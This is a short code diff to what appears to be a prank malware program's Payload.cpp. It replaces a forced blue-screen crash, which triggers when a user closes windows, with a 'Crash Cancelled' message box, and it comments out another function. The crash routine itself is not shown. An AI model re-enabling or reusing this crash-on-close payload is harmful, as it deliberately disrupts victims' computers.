@@ -42,7 +42,8 @@ void pouVitalsCheck() {
 		Sleep(10);
 
 		if (firstCheck > getNumOfWindows()) {
-			BSOD();
+			MessageBox(NULL, L"Crash Cancelled\nPayload.cpp : Line 45", L"Warning", MB_OK | MB_ICONWARNING); // Place Holder
+			//BSOD();
 		}
 		
 		  
@@ -50,6 +51,8 @@ void pouVitalsCheck() {
 	}
 
 }
+
+/*
 
 void pouSaysHello() {
 	//PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_ASYNC | SND_RESOURCE | SND_NOSTOP);
@@ -87,3 +90,5 @@ void pouSaysHello() {
 	//}
 
 }
+
+*/
